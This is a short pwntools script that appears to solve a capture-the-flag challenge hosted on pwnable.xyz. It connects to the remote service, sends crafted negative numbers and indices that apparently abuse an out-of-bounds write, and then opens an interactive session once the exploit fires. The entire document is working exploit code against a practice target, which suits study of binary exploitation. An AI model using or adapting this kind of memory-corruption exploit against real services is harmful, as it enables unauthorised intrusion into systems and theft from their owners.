from pwn import *
 
#p= process("./challenge")
p=remote("svc.pwnable.xyz",30003)
 
context.log_level='debug'
 
p.writeline("-5404319552844595200 0 -6")
p.readuntil("Result: ")
p.writeline("184549376 0 -5")
p.readuntil("Result: ")
p.writeline("1 1 1000")
p.interactive()